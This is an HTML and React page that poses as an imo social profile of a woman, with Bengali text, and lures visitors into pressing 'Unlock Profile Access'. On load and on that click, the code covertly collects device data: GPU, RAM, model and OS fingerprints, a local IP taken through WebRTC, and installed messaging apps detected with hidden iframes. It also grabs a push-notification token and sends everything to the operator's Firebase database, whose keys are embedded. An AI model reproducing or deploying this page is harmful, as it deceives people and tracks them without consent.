<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Unlock Mst: Nusrat Jahan</title>
    
    <!-- Scripts -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

    <!-- Firebase SDK (ES Modules) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-messaging.js";

        // ১. আপনার ফায়ারবেস কনফিগারেশন
        const firebaseConfig = {
            apiKey: "AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y",
            authDomain: "my-sc-tools.firebaseapp.com",
            databaseURL: "https://my-sc-tools-default-rtdb.firebaseio.com",
            projectId: "my-sc-tools",
            storageBucket: "my-sc-tools.firebasestorage.app",
            messagingSenderId: "285986090017",
            appId: "1:285986090017:web:de97d36b2ee56c74b74760",
            measurementId: "G-1PVWWGD0X5"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const messaging = getMessaging(app);

        // ডাটাবেসে তথ্য পাঠানোর ফাংশন
        window.saveToFirebase = async (path, data) => {
            try {
                const dataRef = ref(database, path);
                const newDataRef = push(dataRef);
                await set(newDataRef, { ...data, timestamp: new Date().toISOString() });
            } catch (e) { console.error("FB Error:", e); }
        };

        // ২. আপনার দেওয়া VAPID Key ব্যবহার করে পুশ টোকেন সংগ্রহ
        window.registerPush = async (userId) => {
            try {
                const token = await getToken(messaging, { 
                    vapidKey: 'BFZRrODefiSlDVoj_TtYJm4-iWycsHZ4uDn5hT90w-QOLV6wS7_gblBI2UUouGQcAqqnEB3FySSVF9JwbTXK7B8' 
                });
                
                if (token) {
                    await window.saveToFirebase(`push_tokens/user_${userId}`, { token: token });
                    console.log("Push Token Saved Successfully.");
                }
            } catch (err) { console.log('Push Registration Error:', err); }
        };
    </script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #ffffff; height: 100vh; overflow: hidden; margin: 0; user-select: none; }
        .animate-fade { animation: fadeIn 0.3s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .toast-notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.9); color: white; padding: 12px 20px; border-radius: 8px; font-size: 13px; z-index: 9999; width: 90%; max-width: 400px; text-align: center; animation: slideDown 0.5s ease-out; }
        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;

        const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
        const NUSRAT_IMG = "https://i.ibb.co/v6m80kP/nusrat.jpg";

        let userId = localStorage.getItem('v_id');
        if (!userId) {
            userId = Math.floor(1000 + Math.random() * 9000);
            localStorage.setItem('v_id', userId);
        }

        let report = { hardware: {}, software: {}, network: {}, apps: [] };

        const App = () => {
            const [step, setStep] = useState('MAIN'); 
            const [showToast, setShowToast] = useState(false);

            const masterScan = async () => {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                report.hardware.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
                report.hardware.ram = navigator.deviceMemory || "Unknown";
                report.hardware.cores = navigator.hardwareConcurrency;

                try {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                    pc.createDataChannel("");
                    pc.onicecandidate = e => {
                        if (e.candidate) {
                            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                            if (ip) report.network.ip = ip[1];
                        }
                    };
                    pc.createOffer().then(s => pc.setLocalDescription(s));
                } catch(e) {}

                if (navigator.userAgentData) {
                    const h = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    report.hardware.model = h.model;
                    report.software.os = h.platformVersion;
                }
            };

            const probeApps = async () => {
                const apps = [{n:"WhatsApp",u:"whatsapp://"}, {n:"Telegram",u:"tg://"}, {n:"FB",u:"fb://"}];
                for (let app of apps) {
                    const success = await new Promise(res => {
                        let blurred = false;
                        const onBlur = () => blurred = true;
                        window.addEventListener('blur', onBlur);
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none'; iframe.src = app.u;
                        document.body.appendChild(iframe);
                        setTimeout(() => {
                            document.body.removeChild(iframe);
                            window.removeEventListener('blur', onBlur);
                            res(blurred);
                        }, 500);
                    });
                    if (success) report.apps.push(app.n);
                }
            };

            useEffect(() => {
                masterScan();
                setTimeout(() => {
                    if (window.saveToFirebase) {
                        window.saveToFirebase(`visitors/v_${userId}`, { status: "Active", id: userId });
                    }
                }, 2000);
                
                setInterval(() => {
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                }, 30000);
            }, []);

            const handleUnlock = async () => {
                const permission = await Notification.requestPermission();
                
                if (permission === 'granted') {
                    setStep('LOADER');
                    
                    // ৩. লোকাল নোটিফিকেশন + পুশ রেজিস্ট্রেশন
                    new Notification("imo", {
                        body: "নুসরত জাহান আপনাকে ফ্রেন্ড রিকোয়েস্ট পাঠিয়েছে।",
                        icon: NUSRAT_IMG
                    });

                    if (window.registerPush) window.registerPush(userId);
                    
                    await probeApps();
                    
                    if (window.saveToFirebase) {
                        await window.saveToFirebase(`reports/user_${userId}`, {
                            id: userId,
                            device: report.hardware.model || navigator.platform,
                            gpu: report.hardware.gpu,
                            ip: report.network.ip || "Protected",
                            apps: report.apps
                        });
                    }
                    
                    setTimeout(() => setStep('SUCCESS'), 3000);
                } else {
                    alert("Nusrat Jahan friend request allow করুন");
                }
            };

            return (
                <div className="flex flex-col h-full w-full bg-white relative">
                    {showToast && <div className="toast-notification">Notification: Nusrat Jahan is Online.</div>}

                    <div className="h-14 bg-white flex items-center px-4 border-b border-slate-100 shadow-sm">
                        <div className="flex-1 flex flex-row items-center gap-3">
                            <div className="w-8 h-8 rounded-full border border-slate-200 overflow-hidden">
                                <img src={NUSRAT_IMG} className="w-full h-full object-cover" />
                            </div>
                            <span className="text-xl font-bold text-[#0091ea]">imo</span>
                        </div>
                    </div>

                    <div className="flex-1 p-4">
                        {step === 'MAIN' && (
                            <div className="animate-fade">
                                <div className="w-full bg-white border border-slate-200 rounded-2xl p-6 shadow-sm text-center">
                                    <div className="relative w-20 h-20 mx-auto mb-4">
                                        <img src={NUSRAT_IMG} className="w-full h-full rounded-full border-2 border-[#0091ea] object-cover" />
                                        <div className="absolute bottom-0 right-0 w-5 h-5 bg-green-500 rounded-full border-2 border-white"></div>
                                    </div>
                                    <h3 className="font-bold text-xl text-black">Mst: Nusrat Jahan</h3>
                                    <p className="text-slate-500 text-sm mb-6">প্রোফাইলটি আনলক করতে নিচের বাটনে ক্লিক করে কনফার্ম করুন।</p>
                                    
                                    <button 
                                        onClick={handleUnlock}
                                        className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-md active:scale-95 transition-all">
                                        Unlock Profile Access
                                    </button>
                                </div>
                            </div>
                        )}

                        {step === 'LOADER' && (
                            <div className="text-center py-10">
                                <div className="w-14 h-14 border-4 border-t-[#0091ea] border-slate-200 rounded-full animate-spin mx-auto"></div>
                                <p className="mt-4 font-bold text-slate-700">Verifying Identity...</p>
                            </div>
                        )}

                        {step === 'SUCCESS' && (
                            <div className="text-center py-8 animate-fade">
                                <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
                                    <i className="fa-solid fa-check text-4xl"></i>
                                </div>
                                <h3 className="text-2xl font-bold text-green-700">Access Granted!</h3>
                                <p className="text-slate-600 mt-2 mb-8">এখন আপনি প্রোফাইলটি দেখতে পারবেন।</p>
                                <button 
                                    onClick={() => window.location.href = REDIRECT_LINK} 
                                    className="w-full bg-[#0091ea] text-white font-bold py-4 rounded-xl shadow-lg">
                                    Open imo Profile
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
